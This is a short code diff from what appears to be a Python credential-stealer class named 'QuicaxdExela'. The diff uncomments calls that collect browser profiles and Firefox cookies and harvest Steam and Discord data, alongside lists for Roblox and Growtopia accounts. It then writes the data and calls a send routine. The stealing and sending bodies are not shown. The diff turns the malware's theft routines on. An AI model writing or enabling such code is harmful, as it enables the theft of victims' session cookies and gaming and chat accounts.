@@ -142,13 +142,13 @@ class QuicaxdExela:
         self.steamm = []
         self.robloxx = []
         self.growtopiaa = []        
-        #self.doitEveryProfile()
-        #self.callMozilla()
-        #self.setSteam()
-        #self.setDiscord()
+        self.doitEveryProfile()
+        self.callMozilla()
+        self.setSteam()
+        self.setDiscord()
         self.writeAllData()
         self.sendxd()
-        #self.callMePls()
+        self.callMePls()
     def callMozilla(self):
         self.GetMozillaProfiles()
         self.get_cookies_firefox()
